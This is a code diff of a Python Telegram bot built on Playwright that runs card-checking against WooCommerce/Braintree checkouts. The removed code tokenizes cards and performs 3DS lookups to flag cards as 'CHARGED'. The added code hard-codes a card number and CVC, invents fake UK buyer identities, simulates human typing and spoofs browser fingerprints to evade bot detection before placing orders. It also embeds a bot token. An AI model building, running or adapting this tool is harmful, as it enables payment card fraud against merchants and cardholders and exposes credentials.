@@ -1,629 +1,482 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-VINEX Braintree 3DS Tester — Playwright Edition v3.0
-- بيمشي في الـ flow الطبيعي بالكامل
-- بيملأ الفورم ويضغط PLACE ORDER
-- بيرجّع الرد الفعلي من الموقع (success / failure / 3ds / declined)
-- Turnstile اختياري: لو حلّ نفسه → تمام، لو لأ → نكمل ونشوف رد الموقع
+Braintree Bot — Playwright Human Mode
+- Test on /paypal URL
+- Human typing + mouse
+- Screenshot to Owner on error
 """
-import asyncio, json, re, time, random, uuid, base64, os
+import telebot
+import time, os, re, json, random, threading, logging
 from urllib.parse import urlparse
-from playwright.async_api import async_playwright
+from collections import defaultdict
 
+from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout, Error as PWError
 
-class BraintreeTester:
-    def __init__(self, checkout_url, cookies='', headless=False, debug=False):
-        self.checkout_url = checkout_url
-        p = urlparse(checkout_url)
-        self.host = p.netloc
-        self.base = f'{p.scheme}://{p.netloc}'
-        self.cookies_str = cookies
-        self.headless = headless
-        self.debug = debug
+# ═══════════════════════════════════════════════════════════════════════════════
+#  CONFIG
+# ═══════════════════════════════════════════════════════════════════════════════
+BOT_TOKEN = '8407490230:AAGIDHEYTwvNomiBas_yk4ezIalvweFAQro'
+OWNER_ID  = 6843321125
 
-        # extracted
-        self.auth_fp = None
-        self.merchant_id = None
-        self.woo_nonce = None
-        self.bt_config = None
-        self.order_total = None
-        self.currency = 'GBP'
-        self.turnstile_token = None
-        self.diagnostics = []
+SCREENSHOT_DIR = 'screens'
 
-        self._pw = None
-        self.browser = None
-        self.context = None
-        self.page = None
+CARD_NUMBER = '5523427233579293'
+CARD_MM     = '12'
+CARD_YY     = '2027'
+CARD_CVC    = '953'
 
-    def _log(self, msg):
-        line = f'{time.time():.2f} {msg}'
-        self.diagnostics.append(line)
-        print(line)
+HEADLESS     = False   # ← لو على سيرفر بدون شاشة، غيّرها لـ True
+TYPE_DELAY   = 80      # ms per char
+PAGE_TIMEOUT = 60000
+NAV_TIMEOUT  = 90000
 
-    def _parse_cookies(self):
-        out = []
-        if not self.cookies_str: return out
-        for part in self.cookies_str.split(';'):
-            part = part.strip()
-            if not part or '=' not in part: continue
-            name, _, value = part.partition('=')
-            out.append({
-                'name': name.strip(),
-                'value': value.strip(),
-                'domain': self.host,
-                'path': '/',
-            })
-        return out
+os.makedirs(SCREENSHOT_DIR, exist_ok=True)
 
-    # ═══════════════════════════════════════════════════════════
-    #  STEP 1: open checkout
-    # ═══════════════════════════════════════════════════════════
-    async def _open(self):
-        self._pw = await async_playwright().start()
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s',
+    handlers=[logging.FileHandler('bot.log', encoding='utf-8'), logging.StreamHandler()],
+)
+log = logging.getLogger('bt')
 
-        launch_args = [
-            '--disable-blink-features=AutomationControlled',
-            '--no-sandbox',
-            '--disable-setuid-sandbox',
-            '--disable-dev-shm-usage',
-            '--disable-gpu',
-            '--window-size=540,1170',
-        ]
-        if self.headless:
-            launch_args.append('--headless=new')
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
 
-        self.browser = await self._pw.chromium.launch(
-            headless=self.headless,
-            args=launch_args,
+# ═══════════════════════════════════════════════════════════════════════════════
+#  HUMAN DATA
+# ═══════════════════════════════════════════════════════════════════════════════
+FIRST = ['James','John','Robert','Michael','William','David','Richard','Joseph',
+         'Thomas','Charles','Daniel','Matthew','Anthony','Mark','Donald','Steven',
+         'Paul','Andrew','Joshua','Kenneth','Kevin','Brian','George','Timothy',
+         'Ronald','Edward','Jason','Jeffrey','Ryan','Jacob','Gary','Nicholas']
+
+LAST = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis',
+        'Rodriguez','Martinez','Hernandez','Lopez','Gonzalez','Wilson','Anderson',
+        'Thomas','Taylor','Moore','Jackson','Martin','Lee','Perez','Thompson',
+        'White','Harris','Sanchez','Clark','Ramirez','Lewis','Robinson','Walker']
+
+STREETS = ['High','Church','Park','Victoria','Green','Manor','Kings','Queens',
+           'Station','Mill','School','New','Mount','Forest','Garden','Spring',
+           'Chapel','Bridge','Market','Albert','Windsor','York','Regent','Oxford']
+
+ST_TYPES = ['Street','Road','Lane','Avenue','Close','Drive','Way','Place']
+
+CITIES_UK = [
+    ('London',    'EC1A 1BB'),
+    ('Manchester','M1 1AE'),
+    ('Birmingham','B1 1AA'),
+    ('Leeds',     'LS1 1UR'),
+    ('Liverpool', 'L1 0AA'),
+    ('Bristol',   'BS1 1AA'),
+    ('Sheffield', 'S1 1AA'),
+    ('Newcastle', 'NE1 1AA'),
+    ('Nottingham','NG1 1AA'),
+    ('Leicester', 'LE1 1AA'),
+]
+
+def rnd_name():
+    return random.choice(FIRST), random.choice(LAST)
+
+def rnd_email(f, l):
+    n = random.randint(1, 9999)
+    return random.choice([
+        f'{f.lower()}{n}@gmail.com',
+        f'{f.lower()}.{l.lower()}{n}@gmail.com',
+        f'{f.lower()}{l.lower()}{n}@googlemail.com',
+        f'{f[0].lower()}{l.lower()}{n}@outlook.com',
+    ])
+
+def rnd_address():
+    n = random.randint(1, 250)
+    s = random.choice(STREETS)
+    t = random.choice(ST_TYPES)
+    c, pc = random.choice(CITIES_UK)
+    return f'{n} {s} {t}', c, pc
+
+def rnd_phone():
+    return '07' + ''.join(str(random.randint(0,9)) for _ in range(9))
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  URL VALIDATION
+# ═══════════════════════════════════════════════════════════════════════════════
+_URL_RE = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$')
+
+def safe_url(link):
+    try:
+        if not link or not isinstance(link, str): return None
+        link = link.strip()
+        if not link.startswith(('http://','https://')): link = 'https://' + link
+        p = urlparse(link)
+        if not p.netloc: return None
+        host = p.netloc.split(':')[0]
+        if not _URL_RE.match(host): return None
+        return link
+    except: return None
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  HUMAN HELPERS
+# ═══════════════════════════════════════════════════════════════════════════════
+def pause(a=0.4, b=1.2):
+    time.sleep(random.uniform(a, b))
+
+def type_human(page, selector, text):
+    try:
+        page.fill(selector, '', timeout=5000)
+        page.click(selector, timeout=5000)
+        pause(0.2, 0.5)
+        page.type(selector, text, delay=TYPE_DELAY, timeout=10000)
+        pause(0.3, 0.7)
+        return True
+    except: return False
+
+def mouse_play(page):
+    try:
+        vp = page.viewport_size or {'width':1366,'height':768}
+        for _ in range(random.randint(2,4)):
+            page.mouse.move(
+                random.randint(100, vp['width']-100),
+                random.randint(100, vp['height']-100),
+                steps=random.randint(8,20),
+            )
+            pause(0.2, 0.6)
+        page.mouse.wheel(0, random.randint(100, 300))
+        pause(0.3, 0.8)
+    except: pass
+
+def scroll_page(page):
+    try:
+        for _ in range(random.randint(1,3)):
+            page.mouse.wheel(0, random.randint(150, 400))
+            pause(0.3, 0.7)
+    except: pass
+
+def screenshot(page, tag='err'):
+    try:
+        t = re.sub(r'[^a-zA-Z0-9]','_', tag)[:20]
+        fn = f'{t}_{int(time.time())}_{random.randint(100,999)}.png'
+        fp = os.path.join(SCREENSHOT_DIR, fn)
+        page.screenshot(path=fp, full_page=True, timeout=15000)
+        return fp
+    except Exception as e:
+        log.error(f'screenshot: {e}')
+        return None
+
+def send_shot_to_owner(url, error, shot_path, response=''):
+    try:
+        cap = (
+            f'🚨 <b>ERROR</b>\n'
+            f'━━━━━━━━━━━━━━━━\n'
+            f'🔗 <code>{url[:200]}</code>\n'
+            f'❌ <code>{error[:400]}</code>\n'
         )
+        if response: cap += f'📝 <code>{response[:250]}</code>\n'
+        cap += f'🕐 <code>{time.strftime("%H:%M:%S")}</code>'
 
-        self.context = await self.browser.new_context(
-            viewport={'width': 540, 'height': 1170},
-            user_agent='Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-            locale='en-GB',
-            timezone_id='Europe/London',
-            extra_http_headers={
-                'Accept-Language': 'en-GB,en;q=0.9',
-                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-platform': '"Android"',
-            },
-        )
-
-        await self.context.add_init_script("""
-            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
-            window.chrome = { runtime: {} };
-            Object.defineProperty(navigator, 'languages', {get: () => ['en-GB','en']});
-            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
-            Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
-            Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
-        """)
-
-        cookies = self._parse_cookies()
-        if cookies:
+        if shot_path and os.path.exists(shot_path):
             try:
-                await self.context.add_cookies(cookies)
-                self._log(f'✅ loaded {len(cookies)} cookies')
-            except Exception as e:
-                self._log(f'cookie load err: {e}')
-
-        self.page = await self.context.new_page()
-
-        self._log(f'📄 opening {self.checkout_url}')
-        await self.page.goto(
-            self.checkout_url,
-            wait_until='domcontentloaded',
-            timeout=60000,
-        )
-        await self.page.wait_for_timeout(5000)
-
-        # scroll عشان payment form تتحمل
-        try:
-            await self.page.evaluate('window.scrollBy(0, 800)')
-            await self.page.wait_for_timeout(2000)
-            await self.page.evaluate('window.scrollTo(0, 0)')
-        except: pass
-
-        await self._extract()
-
-    async def _extract(self):
-        """استخراج auth_fp + nonce + total من HTML أولاً ثم من JS"""
-        try:
-            html = await self.page.content()
-        except:
-            html = ''
-
-        # 1. auth_fp من HTML
-        if html:
-            m = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]{100,})"', html)
-            if m:
-                self.auth_fp = m.group(1)
-                self._log(f'✅ auth_fp: {self.auth_fp[:60]}...')
-
-            m = re.search(r'"merchantId"\s*:\s*"([a-z0-9]{10,})"', html)
-            if m:
-                self.merchant_id = m.group(1)
-                self._log(f'✅ merchant_id: {self.merchant_id}')
-
-            m = re.search(r'name="braintree_cc_config_data"\s+value="([^"]+)"', html)
-            if m:
-                from html import unescape
+                with open(shot_path,'rb') as f:
+                    bot.send_photo(OWNER_ID, f, caption=cap, parse_mode='HTML', timeout=120)
+                try: os.remove(shot_path)
+                except: pass
+                return True
+            except:
                 try:
-                    self.bt_config = json.loads(unescape(m.group(1)))
-                    self._log('✅ bt_config من HTML')
+                    with open(shot_path,'rb') as f:
+                        bot.send_document(OWNER_ID, f, caption=re.sub(r'<[^>]+>','',cap)[:1024], timeout=120)
+                    try: os.remove(shot_path)
+                    except: pass
+                    return True
+                except Exception as e:
+                    log.error(f'send shot: {e}')
+        else:
+            try: bot.send_message(OWNER_ID, cap, parse_mode='HTML')
+            except: pass
+    except Exception as e:
+        log.error(f'send_shot: {e}')
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  PLAYWRIGHT FLOW
+# ═══════════════════════════════════════════════════════════════════════════════
+def do_flow(page, url):
+    """Fill form, submit, read response. Returns dict."""
+    res = {'status':'unknown','response':'','error':'','screenshot':None}
+
+    # Random human data
+    f, l = rnd_name()
+    email = rnd_email(f, l)
+    addr, city, pc = rnd_address()
+    phone = rnd_phone()
+
+    try:
+        # ═══ Navigate ═══
+        log.info(f'navigate: {url}')
+        try:
+            page.goto(url, wait_until='domcontentloaded', timeout=NAV_TIMEOUT)
+        except PWTimeout:
+            log.warning('nav timeout, continue')
+
+        pause(2.0, 4.0)
+        mouse_play(page)
+        scroll_page(page)
+
+        # ═══ Fill form ═══
+        log.info(f'fill: {f} {l} | {email}')
+
+        for sel in ['#billing_first_name','input[name="billing_first_name"]']:
+            if type_human(page, sel, f): break
+        pause(0.3, 0.8)
+
+        for sel in ['#billing_last_name','input[name="billing_last_name"]']:
+            if type_human(page, sel, l): break
+        pause(0.3, 0.8)
+
+        for sel in ['#billing_country','select[name="billing_country"]']:
+            try: page.select_option(sel, 'GB', timeout=3000); break
+            except: pass
+        pause(0.3, 0.8)
+
+        for sel in ['#billing_address_1','input[name="billing_address_1"]']:
+            if type_human(page, sel, addr): break
+        pause(0.3, 0.8)
+
+        for sel in ['#billing_city','input[name="billing_city"]']:
+            if type_human(page, sel, city): break
+        pause(0.3, 0.8)
+
+        for sel in ['#billing_postcode','input[name="billing_postcode"]']:
+            if type_human(page, sel, pc): break
+        pause(0.3, 0.8)
+
+        for sel in ['#billing_phone','input[name="billing_phone"]']:
+            if type_human(page, sel, phone): break
+        pause(0.3, 0.8)
+
+        for sel in ['#billing_email','input[name="billing_email"]']:
+            if type_human(page, sel, email): break
+        pause(0.5, 1.2)
+
+        # ═══ Card fields (iframes) ═══
+        log.info('fill card iframes')
+        card_filled = False
+        for frame in page.frames:
+            furl = (frame.url or '').lower()
+            if 'braintree' in furl or 'hosted-fields' in furl or 'paypal' in furl:
+                try:
+                    for sel in ['input[name="number"]','input[name*="card-number"]','#credit-card-number']:
+                        try: frame.fill(sel, CARD_NUMBER, timeout=2000); card_filled=True; break
+                        except: continue
+                    for sel in ['input[name="expirationDate"]','input[name*="expiration"]','input[name*="expiry"]']:
+                        try: frame.fill(sel, f'{CARD_MM}/{CARD_YY}', timeout=2000); break
+                        except: continue
+                    for sel in ['input[name="cvv"]','input[name*="cvc"]','input[name*="security-code"]']:
+                        try: frame.fill(sel, CARD_CVC, timeout=2000); break
+                        except: continue
+                except: continue
+
+        if not card_filled:
+            for sel, val in [
+                ('#card_number', CARD_NUMBER),
+                ('#card_expiry', f'{CARD_MM}/{CARD_YY}'),
+                ('#card_cvc', CARD_CVC),
+            ]:
+                try: page.fill(sel, val, timeout=1500)
                 except: pass
 
-        # 2. fallback: client_token
-        if not self.auth_fp:
+        pause(0.5, 1.0)
+        mouse_play(page)
+
+        # ═══ Terms ═══
+        for sel in ['#terms','input[name="terms"]','input[name="gdpr_woo_consent"]']:
             try:
-                data = await self.page.evaluate('''
-                    () => {
-                        if (typeof wc_braintree_client_token !== 'undefined' &&
-                            wc_braintree_client_token && wc_braintree_client_token[0]) {
-                            return wc_braintree_client_token[0];
-                        }
-                        const el = document.querySelector('input[name="braintree_cc_config_data"]');
-                        if (el && el.value) return '__CONFIG__:' + el.value;
-                        return null;
-                    }
-                ''')
-            except: data = None
-
-            if data:
-                try:
-                    if data.startswith('__CONFIG__:'):
-                        cfg = json.loads(data.replace('__CONFIG__:', ''))
-                    else:
-                        clean = data.strip().replace('\n','').replace('\r','').replace(' ','')
-                        clean = re.sub(r'[^A-Za-z0-9+/=]', '', clean)
-                        while len(clean) % 4 != 0: clean += '='
-                        decoded = base64.b64decode(clean).decode('utf-8', errors='ignore')
-                        cfg = json.loads(decoded)
-                    self.bt_config = cfg
-                    self.auth_fp = cfg.get('authorizationFingerprint')
-                    self.merchant_id = cfg.get('merchantId')
-                    self._log(f'✅ client_token decoded')
-                except Exception as e:
-                    self._log(f'decode err: {e}')
-
-        # 3. woo nonce
-        try:
-            self.woo_nonce = await self.page.evaluate('''
-                () => {
-                    const el = document.querySelector('input[name="woocommerce-process-checkout-nonce"]');
-                    return el ? el.value : null;
-                }
-            ''')
-            self._log(f'✅ woo_nonce: {self.woo_nonce}')
-        except: pass
-
-        # 4. order total
-        try:
-            total = await self.page.evaluate('''
-                () => {
-                    const el = document.querySelector('.order-total .amount bdi');
-                    if (el) return el.textContent.trim();
-                    return null;
-                }
-            ''')
-            if total:
-                self.order_total = re.sub(r'[^\d.]', '', total)
-                self._log(f'✅ order_total: {self.order_total}')
-        except: pass
-
-        # 5. Turnstile — بس نبص عليه سريع (لو موجود، بنستخدمه)
-        await self._check_turnstile_quick()
-
-    async def _check_turnstile_quick(self):
-        """بص سريع على Turnstile — من غير انتظار"""
-        try:
-            token = await self.page.evaluate('''
-                () => {
-                    const el = document.querySelector('input[name="cf-turnstile-response"]');
-                    if (el && el.value && el.value.length > 20) return el.value;
-                    if (window.turnstile && typeof turnstile.getResponse === 'function') {
-                        const widgets = document.querySelectorAll('.cf-turnstile');
-                        for (let w of widgets) {
-                            try {
-                                const r = turnstile.getResponse(w);
-                                if (r && r.length > 20) return r;
-                            } catch(e) {}
-                        }
-                    }
-                    return null;
-                }
-            ''')
-            if token and len(token) > 20:
-                self.turnstile_token = token
-                self._log(f'✅ turnstile موجود: {token[:30]}...')
-            else:
-                self._log('⚠️  مفيش turnstile — هنكمل برضه')
-        except: pass
-
-    # ═══════════════════════════════════════════════════════════
-    #  STEP 2: Charge — يمشي في الـ flow ويجيب الرد
-    # ═══════════════════════════════════════════════════════════
-    async def Charge(self, card):
-        parts = card.strip().split('|')
-        if len(parts) < 4: return 'INVALID_FORMAT'
-        number = parts[0].replace(' ', '')
-        mm = parts[1].zfill(2)
-        yy = parts[2]
-        if len(yy) == 4: yy = yy[2:]
-        cvc = parts[3]
-
-        try:
-            await self._open()
-
-            if not self.auth_fp:
-                return 'NO_AUTH_FP'
-            if not self.woo_nonce:
-                return 'NO_WOO_NONCE'
-
-            result = await self._flow(number, mm, yy, cvc)
-            return result
-
-        except Exception as e:
-            self._log(f'❌ charge err: {e}')
-            import traceback
-            if self.debug: traceback.print_exc()
-            return f'FATAL: {str(e)[:200]}'
-        finally:
-            try: await self.browser.close()
-            except: pass
-            try: await self._pw.stop()
-            except: pass
-
-    async def _flow(self, number, mm, yy, cvc):
-        """
-        الـ flow الكامل:
-        1) tokenize → nonce
-        2) 3DS lookup (بس عشان نعرف enrolled/challenge)
-        3) نحط الـ nonce في الفورم + نضغط PLACE ORDER
-        4) نقرأ الرد اللي الموقع رجعه
-        """
-
-        # ─── 1. tokenize ───
-        self._log('🔐 tokenizing...')
-        tok_payload = {
-            'query': (
-                'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {'
-                '  tokenizeCreditCard(input: $input) {'
-                '    token creditCard { bin brandCode last4 }'
-                '  }'
-                '}'
-            ),
-            'variables': {
-                'input': {
-                    'creditCard': {
-                        'number': number,
-                        'expirationMonth': mm,
-                        'expirationYear': yy,
-                        'cvv': cvc,
-                        'billingAddress': {
-                            'postalCode': 'OX14 4PG',
-                            'streetAddress': 'W356',
-                        },
-                    },
-                    'options': {'validate': False},
-                }
-            },
-            'operationName': 'TokenizeCreditCard',
-        }
-
-        tok = await self.page.evaluate(
-            '''async (args) => {
-                const payload = {
-                    ...args.payload,
-                    clientSdkMetadata: {
-                        source: 'client',
-                        integration: 'custom',
-                        sessionId: crypto.randomUUID(),
-                    },
-                };
-                try {
-                    const r = await fetch('https://payments.braintree-api.com/graphql', {
-                        method: 'POST',
-                        headers: {
-                            'Authorization': 'Bearer ' + args.auth_fp,
-                            'braintree-version': '2018-05-10',
-                            'content-type': 'application/json',
-                        },
-                        body: JSON.stringify(payload),
-                    });
-                    return await r.json();
-                } catch(e) {
-                    return { error: String(e) };
-                }
-            }''',
-            {'payload': tok_payload, 'auth_fp': self.auth_fp},
-        )
-
-        if 'errors' in tok:
-            return f'TOKENIZE_ERROR: {json.dumps(tok["errors"])[:200]}'
-
-        nonce = tok.get('data', {}).get('tokenizeCreditCard', {}).get('token')
-        if not nonce:
-            return f'NO_NONCE: {json.dumps(tok)[:200]}'
-        self._log(f'✅ nonce: {nonce[:40]}...')
-
-        # ─── 2. 3DS lookup (معلوماتي بس) ───
-        self._log('🔍 3DS lookup...')
-        bin_num = number[:6]
-        amount = self.order_total or '1.00'
-
-        lookup_payload = {
-            'amount': amount,
-            'browserColorDepth': 24,
-            'browserJavaEnabled': False,
-            'browserJavascriptEnabled': True,
-            'browserLanguage': 'en-GB',
-            'browserScreenHeight': 1170,
-            'browserScreenWidth': 540,
-            'browserTimeZone': -60,
-            'deviceChannel': 'Browser',
-            'additionalInfo': {
-                'billingLine1': 'W356',
-                'billingCity': 'London',
-                'billingState': '',
-                'billingPostalCode': 'OX14 4PG',
-                'billingCountryCode': 'GB',
-                'billingPhoneNumber': '447700900123',
-                'billingGivenName': 'Test',
-                'billingSurname': 'User',
-                'email': f'test{random.randint(100,999)}@gmail.com',
-            },
-            'bin': bin_num,
-            'dfReferenceId': f'0_{uuid.uuid4()}',
-            'clientMetadata': {
-                'requestedThreeDSecureVersion': '2',
-                'sdkVersion': 'web/3.144.0',
-                'cardinalDeviceDataCollectionTimeElapsed': 12,
-                'issuerDeviceDataCollectionTimeElapsed': 3610,
-                'issuerDeviceDataCollectionResult': True,
-            },
-            'authorizationFingerprint': self.auth_fp,
-            'braintreeLibraryVersion': 'braintree/web/3.144.0',
-            '_meta': {
-                'merchantAppId': self.host,
-                'platform': 'web',
-                'sdkVersion': '3.144.0',
-                'source': 'client',
-                'integration': 'custom',
-                'integrationType': 'custom',
-                'sessionId': str(uuid.uuid4()),
-            },
-        }
-
-        lk = await self.page.evaluate(
-            '''async (args) => {
-                const url = 'https://api.braintreegateway.com/merchants/' +
-                    args.merchant_id +
-                    '/client_api/v1/payment_methods/' +
-                    args.nonce +
-                    '/three_d_secure/lookup';
-                try {
-                    const r = await fetch(url, {
-                        method: 'POST',
-                        headers: { 'content-type': 'application/json' },
-                        body: JSON.stringify(args.payload),
-                    });
-                    return await r.json();
-                } catch(e) {
-                    return { error: String(e) };
-                }
-            }''',
-            {'merchant_id': self.merchant_id, 'nonce': nonce, 'payload': lookup_payload},
-        )
-
-        enrolled = None
-        challenge = None
-        version = '?'
-        if 'errors' not in lk:
-            info = lk.get('threeDSecureInfo', {}) or lk.get('lookup', {}) or lk
-            challenge = bool(info.get('challengeRequired'))
-            enrolled = info.get('enrolled')
-            version = info.get('threeDSecureVersion', '?')
-            self._log(f'📋 enrolled={enrolled} challenge={challenge} v={version}')
-        else:
-            self._log(f'⚠️  lookup err: {json.dumps(lk["errors"])[:150]}')
-
-        # ─── 3. نحط الـ nonce في الفورم (زي المتصفح) ───
-        self._log('📝 filling form fields...')
-        await self.page.evaluate(
-            '''(nonce) => {
-                const set_val = (sel, val) => {
-                    const el = document.querySelector(sel);
-                    if (el) { el.value = val; return true; }
-                    return false;
-                };
-                set_val('#braintree_cc_nonce_key', nonce);
-                // device data
-                const dev = document.querySelector('#braintree_cc_device_data');
-                if (dev) dev.value = JSON.stringify({correlation_id: crypto.randomUUID().slice(0,32)});
-                // املأ الفورم بحقول مطلوبة (زي المتصفح)
-                const fill = (name, val) => {
-                    const el = document.querySelector('input[name="'+name+'"]');
-                    if (el && !el.value) el.value = val;
-                };
-                fill('billing_first_name', 'Test');
-                fill('billing_last_name', 'User');
-                fill('billing_address_1', 'W356');
-                fill('billing_address_2', 'W456');
-                fill('billing_city', 'London');
-                fill('billing_state', 'W266');
-                fill('billing_postcode', 'OX14 4PG');
-                fill('billing_phone', '447700900123');
-                fill('billing_email', 'test' + Math.floor(Math.random()*1000) + '@gmail.com');
-                // terms + gdpr
-                const terms = document.querySelector('#terms');
-                if (terms) terms.checked = true;
-                const gdpr = document.querySelector('#gdpr_woo_consent');
-                if (gdpr) gdpr.checked = true;
-                return true;
-            }''',
-            nonce,
-        )
-
-        # ─── 4. نضغط PLACE ORDER زي المستخدم ───
-        self._log('🖱️  clicking PLACE ORDER...')
-
-        # نضيف listener عشان نلتقط رد الـ checkout
-        checkout_response = {}
-
-        async def on_response(resp):
-            try:
-                if 'wc-ajax=checkout' in resp.url:
-                    try:
-                        checkout_response['json'] = await resp.json()
-                    except:
-                        checkout_response['text'] = await resp.text()
-                    checkout_response['status'] = resp.status
-            except: pass
-
-        self.page.on('response', on_response)
-
-        # نضغط الزرار
-        try:
-            await self.page.click('#place_order', timeout=10000)
-            self._log('   ✅ clicked #place_order')
-        except Exception as e:
-            self._log(f'   ❌ click failed: {e}')
-            # نحاول نعمل submit يدوي
-            try:
-                await self.page.evaluate('''
-                    () => {
-                        const form = document.querySelector('form.checkout, form.woocommerce-checkout');
-                        if (form) form.submit();
-                    }
-                ''')
-                self._log('   ⚠️  form.submit() called manually')
-            except: pass
-
-        # ─── 5. نستنى الرد ───
-        self._log('⏳ waiting for checkout response...')
-        for _ in range(45):  # 45 ثانية
-            if checkout_response.get('json') or checkout_response.get('text'):
+                if not page.is_checked(sel, timeout=1000): page.check(sel, timeout=2000)
                 break
-            await asyncio.sleep(1)
+            except: continue
+        pause(0.5, 1.0)
 
-        # ─── 6. نقرأ الرد ───
-        resp_data = checkout_response.get('json')
-        resp_text = checkout_response.get('text', '')
+        # ═══ Submit ═══
+        log.info('submit')
+        clicked = False
+        for sel in ['#place_order','button[name="woocommerce_checkout_place_order"]',
+                    'input[name="woocommerce_checkout_place_order"]',
+                    'button[type="submit"]']:
+            try: page.click(sel, timeout=4000); clicked=True; break
+            except: continue
 
-        # لو ما فيش رد لسه، نجرب نقرأه من الـ URL / body
-        if not resp_data and not resp_text:
-            try:
-                # لو الصفحة اتغيرت لـ order-received
-                current_url = self.page.url
-                if 'order-received' in current_url:
-                    return f'CHARGED {self.order_total} {self.currency}'
+        if not clicked:
+            res['error'] = 'NO_SUBMIT_BUTTON'
+            res['screenshot'] = screenshot(page, 'no_submit')
+            return res
 
-                # نقرأ body
-                body = await self.page.evaluate('() => document.body.innerText')
-                if 'thank you' in body.lower() or 'order received' in body.lower():
-                    return f'CHARGED {self.order_total} {self.currency}'
+        page.wait_for_timeout(12000)
 
-                # نقرأ رسائل الأخطاء
-                err = await self.page.evaluate('''
-                    () => {
-                        const els = document.querySelectorAll('.woocommerce-error li, .wc-braintree-checkout-error, ul.woocommerce-error');
-                        return Array.from(els).map(e => e.textContent.trim()).join(' | ');
-                    }
-                ''')
-                if err:
-                    return self._parse_woo_message(err, enrolled, challenge, version)
+        # ═══ Read response ═══
+        log.info('read response')
+        try:
+            r = page.evaluate("""() => {
+                const err = document.querySelector('.woocommerce-error, .wc-block-components-notice-banner.is-error');
+                const suc = document.querySelector('.woocommerce-message, .wc-block-components-notice-banner.is-success');
+                if (err) return 'ERROR: ' + err.textContent.trim().substring(0,400);
+                if (suc) return 'SUCCESS: ' + suc.textContent.trim().substring(0,400);
+                if (window.location.href.includes('order-received')) return 'ORDER_RECEIVED';
+                return 'UNKNOWN';
+            }""")
+            res['response'] = r
+            low = r.lower()
+            if 'order_received' in low or 'success' in low or 'thank you' in low:
+                res['status'] = 'live'
+            elif '3d secure' in low or '3ds' in low:
+                res['status'] = 'live'
+                res['response'] = '3DS_CHALLENGE: ' + r[:200]
+            elif any(k in low for k in ['declined','rejected','insufficient','cvv','expired','verify','human']):
+                res['status'] = 'live'
+            else:
+                res['status'] = 'unknown'
+                res['screenshot'] = screenshot(page, 'unknown')
+        except Exception as e:
+            res['error'] = f'READ: {e}'
+            res['screenshot'] = screenshot(page, 'read_err')
 
+    except PWTimeout as e:
+        res['error'] = f'TIMEOUT: {str(e)[:150]}'
+        res['screenshot'] = screenshot(page, 'timeout')
+    except PWError as e:
+        res['error'] = f'PW_ERROR: {str(e)[:150]}'
+        res['screenshot'] = screenshot(page, 'pw_err')
+    except Exception as e:
+        res['error'] = f'EXCEPTION: {str(e)[:150]}'
+        res['screenshot'] = screenshot(page, 'exc')
+
+    return res
+
+def run_session(url):
+    final = {'status':'unknown','response':'','error':'','screenshot':None}
+    try:
+        with sync_playwright() as p:
+            browser = p.chromium.launch(
+                headless=HEADLESS,
+                args=[
+                    '--disable-blink-features=AutomationControlled',
+                    '--no-sandbox','--disable-dev-shm-usage',
+                    '--disable-setuid-sandbox','--disable-web-security',
+                ]
+            )
+            ctx = browser.new_context(
+                viewport={'width':1366,'height':768},
+                user_agent=('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+                            'AppleWebKit/537.36 (KHTML, like Gecko) '
+                            'Chrome/120.0.0.0 Safari/537.36'),
+                locale='en-GB',
+                timezone_id='Europe/London',
+                ignore_https_errors=True,
+            )
+            ctx.add_init_script("""
+                Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
+                Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
+                Object.defineProperty(navigator,'languages',{get:()=>['en-GB','en']});
+                window.chrome={runtime:{}};
+            """)
+            page = ctx.new_page()
+            page.set_default_timeout(PAGE_TIMEOUT)
+            page.set_default_navigation_timeout(NAV_TIMEOUT)
+
+            result = do_flow(page, url)
+            final.update(result)
+
+            try: ctx.close()
             except: pass
+            try: browser.close()
+            except: pass
+    except Exception as e:
+        final['error'] = f'LAUNCH: {str(e)[:150]}'
+    return final
 
-            return 'NO_RESPONSE (timeout)'
+# ═══════════════════════════════════════════════════════════════════════════════
+#  BOT HANDLER — Direct test on /paypal <url>
+# ═══════════════════════════════════════════════════════════════════════════════
+@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
+def handle_paypal(msg):
+    try:
+        parts = msg.text.split(maxsplit=1)
+        if len(parts) < 2:
+            bot.reply_to(msg, 'Usage: /paypal <url>')
+            return
+        link = safe_url(parts[1].strip())
+        if not link:
+            bot.reply_to(msg, 'Invalid URL')
+            return
 
-        # ─── 7. نحلل الرد ───
-        if resp_data:
-            return self._parse_woo_response(resp_data, enrolled, challenge, version)
+        status_msg = bot.reply_to(msg, f'Testing: {link[:80]}\nPlease wait...')
 
-        # نص HTML
-        return self._parse_woo_message(resp_text, enrolled, challenge, version)
+        def worker():
+            try:
+                result = run_session(link)
+                status = result.get('status','unknown')
+                response = (result.get('response') or '')[:300]
+                error = (result.get('error') or '')[:300]
+                shot = result.get('screenshot')
 
-    def _parse_woo_response(self, j, enrolled, challenge, version):
-        """تحليل JSON من WooCommerce checkout"""
-        if not isinstance(j, dict):
-            return f'UNKNOWN: {str(j)[:200]}'
+                # Send error screenshot to owner
+                if error or shot:
+                    send_shot_to_owner(link, error or 'screenshot', shot, response)
 
-        result = j.get('result')
